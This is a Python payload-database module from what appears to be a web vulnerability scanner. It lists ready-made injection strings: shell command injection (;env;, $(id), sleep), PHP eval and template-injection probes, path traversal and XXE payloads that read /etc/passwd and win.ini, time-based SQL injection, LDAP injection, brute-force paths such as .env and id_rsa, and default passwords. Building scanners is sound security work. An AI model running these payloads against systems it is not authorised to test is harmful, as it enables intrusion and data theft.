"""Payload databases used by the attack modules.

Placeholders are expanded by the Mutator (see protest.active.base) and by the
modules themselves:
    [TIME]  number of seconds a time-based payload must make the server wait
    [NULL]  a NUL byte (sent url-encoded as %00)
    [LF]    a line feed
"""
import hashlib

from protest.active.base import Payload

# ---------------------------------------------------------------------- command / code execution
UNIX_ENV_RULE = r"regex:(?s)(?=.*\bPATH=[^=\s]*)(?=.*\b(?:PWD|HOME|HOSTNAME|SHELL)=)"
WINDOWS_ENV_RULE = r"regex:(?is)(?=.*\bPATH=)(?=.*\bCOMSPEC=)"
UNIX_ID_RULE = r"regex:uid=\d+\([\w.-]+\)\s+gid=\d+\([\w.-]+\)"
EVAL_MARKER = "w4pyt1_eval"
EVAL_MD5 = hashlib.md5(EVAL_MARKER.encode()).hexdigest()  # nosec - marker only


def exec_payloads():
    entries = [
        ("env", [UNIX_ENV_RULE]), (";env;", [UNIX_ENV_RULE]), ("|env", [UNIX_ENV_RULE]),
        ("&&env", [UNIX_ENV_RULE]), ("a;env;", [UNIX_ENV_RULE]), ("[VALUE];env;", [UNIX_ENV_RULE]),
        ("[VALUE]|env", [UNIX_ENV_RULE]), ("[VALUE][LF]env", [UNIX_ENV_RULE]), ("$(env)", [UNIX_ENV_RULE]),
        ("`env`", [UNIX_ENV_RULE]), ("id", [UNIX_ID_RULE]), (";id;", [UNIX_ID_RULE]), ("|id", [UNIX_ID_RULE]),
        ("[VALUE];id", [UNIX_ID_RULE]), ("[VALUE]|id", [UNIX_ID_RULE]), ("$(id)", [UNIX_ID_RULE]),
        ("set", [WINDOWS_ENV_RULE]), ("&set&", [WINDOWS_ENV_RULE]), ("|set", [WINDOWS_ENV_RULE]),
        ("[VALUE]&set", [WINDOWS_ENV_RULE]), ("[VALUE]|set", [WINDOWS_ENV_RULE]),
        ("../../../../../../../../../../usr/bin/env|", [UNIX_ENV_RULE]),
    ]
    for payload, rules in entries:
        yield Payload(payload.replace("[LF]", "\n"), rules=rules, description="Command execution")

    for prefix in ("a;", '";', "';", '".', "'.", ";"):
        for suffix in ("//", "#"):
            yield Payload(f"{prefix}exit(md5('{EVAL_MARKER}')){';' if prefix.endswith(';') else ';'}{suffix}",
                          rules=[EVAL_MD5], description="PHP evaluation")
    yield Payload(f"{{{{7*7}}}}{EVAL_MARKER}", rules=[f"49{EVAL_MARKER}"], description="Template injection (SSTI)")
    yield Payload(f"${{7*7}}{EVAL_MARKER}", rules=[f"49{EVAL_MARKER}"], description="Template injection (SSTI)")

    for payload in ("a;sleep [TIME];", "a|sleep [TIME];", "a`sleep [TIME]`", "$(sleep [TIME])",
                    "[VALUE];sleep [TIME];", "&ping -n [PINGS] 127.0.0.1&", "|ping -n [PINGS] 127.0.0.1"):
        yield Payload(payload, type="time", description="Blind command execution")


EXEC_WARNINGS = {
    "eval()'d code</b> on line <b>": "Warning eval()",
    "Cannot execute a blank command in": "Warning exec",
    "sh: command substitution:": "Warning exec",
    "sh: 1: Syntax error": "Warning shell syntax error",
    "Warning: usort()": "Warning usort()",
    "Warning: assert():": "Warning assert",
    "Failure evaluating code:": "Evaluation warning",
}

# ---------------------------------------------------------------------- file handling
PASSWD = (["root:x:0:0", "root:*:0:0"], ["Linux local file disclosure vulnerability",
                                          "BSD local file disclosure vulnerability"])
WIN_INI = (["[fonts]", "for 16-bit app support"], ["Windows local file disclosure vulnerability"] * 2)
SERVICES = (["Network services, Internet style"], ["Unix local file disclosure vulnerability"])


def file_payloads():
    entries = []
    for up in ("", "../" * 6, "../" * 10, "../" * 20, "....//" * 10, "..\\" * 10):
        entries.append((f"{up}/etc/passwd" if not up else f"{up}etc/passwd", PASSWD))
        entries.append((f"{up}etc/passwd[NULL]" if up else "/etc/passwd[NULL]", PASSWD))
    entries += [
        ("[DIRVALUE]/../../../../../../../../etc/passwd", PASSWD),
        ("file:///etc/passwd", PASSWD),
        ("/etc/services", SERVICES),
        ("../../../../../../../../../../etc/services", SERVICES),
        ("C:\\Windows\\win.ini", WIN_INI),
        ("C:/Windows/win.ini", WIN_INI),
        ("../../../../../../../../../../Windows/win.ini", WIN_INI),
        ("..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini", WIN_INI),
        ("C:\\Windows\\win.ini[NULL]", WIN_INI),
        ("file:///C:/Windows/win.ini", WIN_INI),
        ("php://filter/read=convert.base64-encode/resource=[FILE_NAME]",
         (["PD9waHA"], ["PHP source code disclosure (php://filter)"])),
        ("php://filter/read=convert.base64-encode/resource=[FILE_NOEXT]",
         (["PD9waHA"], ["PHP source code disclosure (php://filter)"])),
        ("[FILE_NAME]", (["<?php"], ["Source code disclosure"])),
        ("data:;base64,PD9waHAgZWNobyAndzRweXQxJywnX2luY2x1ZGUnOyA/Pg==",
         (["w4pyt1_include"], ["Remote inclusion vulnerability (data://)"])),
    ]
    for payload, (rules, messages) in entries:
        yield Payload(payload.replace("[NULL]", "\x00"), rules=list(rules), messages=list(messages))


FILE_WARNINGS = [
    ("java.io.FileNotFoundException:", "Java include/open"),
    ("System.IO.FileNotFoundException:", ".NET File.Open*"),
    ("System.IO.DirectoryNotFoundException:", ".NET File.Open*"),
    ("error '800a0046'", "VBScript OpenTextFile"),
    ("FileNotFoundError: [Errno 2]", "Python open()"),
    ("ENOENT: no such file or directory", "Node.js fs"),
]

# ---------------------------------------------------------------------- time based SQL injection
TIMESQL_PAYLOADS = [
    "sleep([TIME])#",
    "[VALUE] AND SLEEP([TIME])",
    "[VALUE] AND SLEEP([TIME])-- ",
    "[VALUE]' AND SLEEP([TIME])-- ",
    "[VALUE]\" AND SLEEP([TIME])-- ",
    "[VALUE]' AND SLEEP([TIME]) AND '1'='1",
    "[VALUE]\" AND SLEEP([TIME]) AND \"1\"=\"1",
    "[VALUE]' OR SLEEP([TIME])-- ",
    "[VALUE] OR SLEEP([TIME])",
    "[VALUE]) AND SLEEP([TIME])-- ",
    "[VALUE]') AND SLEEP([TIME])-- ",
    "[VALUE] AND (SELECT * FROM (SELECT(SLEEP([TIME])))a)",
    "[VALUE]' AND (SELECT * FROM (SELECT(SLEEP([TIME])))a)-- ",
    "[VALUE]';SELECT pg_sleep([TIME])-- ",
    "[VALUE];SELECT pg_sleep([TIME])-- ",
    "[VALUE]' AND 1=(SELECT 1 FROM pg_sleep([TIME]))-- ",
    "[VALUE]';WAITFOR DELAY '0:0:[TIME]'-- ",
    "[VALUE];WAITFOR DELAY '0:0:[TIME]'-- ",
    "[VALUE]' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',[TIME])-- ",
]

# ---------------------------------------------------------------------- backup files
BACKUP_PAYLOADS = [
    "[FILE_NAME].bak", "[FILE_NAME]~", "[FILE_NAME].old", "[FILE_NAME].orig", "[FILE_NAME].save",
    ".[FILE_NAME].swp", "[FILE_NAME].swp", "[FILE_NAME].tmp", "[FILE_NAME].txt", "[FILE_NAME].copy",
    "[FILE_NAME].1", "[FILE_NAME].zip", "[FILE_NAME].tar.gz", "[FILE_NOEXT].bak", "[FILE_NOEXT].old",
    "Copy of [FILE_NAME]", "#[FILE_NAME]#", "_[FILE_NAME]", "[FILE_NAME].back", "[FILE_NAME].backup",
    "backup.zip", "backup.tar.gz", "backup.sql", "site.zip", "www.zip", "database.sql", "dump.sql", "db.sql",
]

# ---------------------------------------------------------------------- directory / file brute force
BUSTER_WORDS = [
    ".env", ".git/HEAD", ".git/config", ".svn/entries", ".hg/", ".DS_Store", ".htaccess", ".htpasswd",
    ".well-known/security.txt", "admin/", "administrator/", "admin.php", "admin/login.php", "adminer.php",
    "api/", "api/v1/", "app/", "assets/", "backup/", "backups/", "bin/", "cgi-bin/", "config/", "config.php",
    "config.json", "config.yml", "configuration.php", "console/", "cpanel/", "dashboard/", "data/", "db/",
    "debug/", "dev/", "docs/", "download/", "downloads/", "dump/", "env", "error_log", "files/", "include/",
    "includes/", "info.php", "install/", "install.php", "jenkins/", "lib/", "log/", "logs/", "login/",
    "login.php", "manager/html", "old/", "panel/", "phpinfo.php", "phpmyadmin/", "pma/", "private/",
    "robots.txt", "server-info", "server-status", "setup/", "setup.php", "sitemap.xml", "sql/", "staging/",
    "swagger.json", "swagger/", "swagger-ui.html", "openapi.json", "temp/", "test/", "test.php", "tmp/",
    "tools/", "upload/", "uploads/", "user/", "users/", "vendor/", "web.config", "webadmin/", "wp-admin/",
    "wp-config.php.bak", "wp-login.php", "actuator/", "actuator/env", "actuator/health", "metrics",
    "graphql", "status", "health", "trace.axd", "elmah.axd", "composer.json", "package.json", "Dockerfile",
    "docker-compose.yml", "id_rsa", "readme.md", "README.md", "CHANGELOG.md", "crossdomain.xml",
]

# ---------------------------------------------------------------------- LDAP
LDAP_PAYLOADS = ["*)(&", "*)(|(objectclass=*)", ")(cn=*", "*()|&'", "*)(uid=*))(|(uid=*", "\\"]
LDAP_ERRORS = [
    "supplied argument is not a valid ldap", "javax.naming.NameNotFoundException", "javax.naming.directory",
    "LDAPException", "com.sun.jndi.ldap", "Search: Bad search filter", "Bad search filter",
    "Protocol error occurred", "Size limit has exceeded", "An inappropriate matching occurred",
    "A constraint violation occurred", "The syntax is invalid", "The search filter is incorrect",
    "The search filter is invalid", "The search filter cannot be recognized", "Invalid DN syntax",
    "IPWorksASP.LDAP", "Module Products.LDAPMultiPlugins", "ldap_search(", "ldap_bind(", "ldap_errno",
    "System.DirectoryServices.DirectoryServicesCOMException", "Unbalanced parenthesis",
    "Filter error", "invalid filter", "ldap3.core.exceptions",
]

# ---------------------------------------------------------------------- weak credentials
USERS = ["admin", "administrator", "root", "user", "test", "guest", "demo"]
PASSWORDS = ["admin", "password", "123456", "12345678", "root", "toor", "test", "guest", "letmein", "changeme",
             "qwerty", "admin123", "password1", "demo"]

# ---------------------------------------------------------------------- XXE (in-band)
XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE protest [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<protest>&xxe;</protest>', PASSWD),
    ('<?xml version="1.0"?><!DOCTYPE protest [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
     '<protest>&xxe;</protest>', WIN_INI),
    ('<?xml version="1.0"?><!DOCTYPE protest [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><protest/>',
     PASSWD),
]
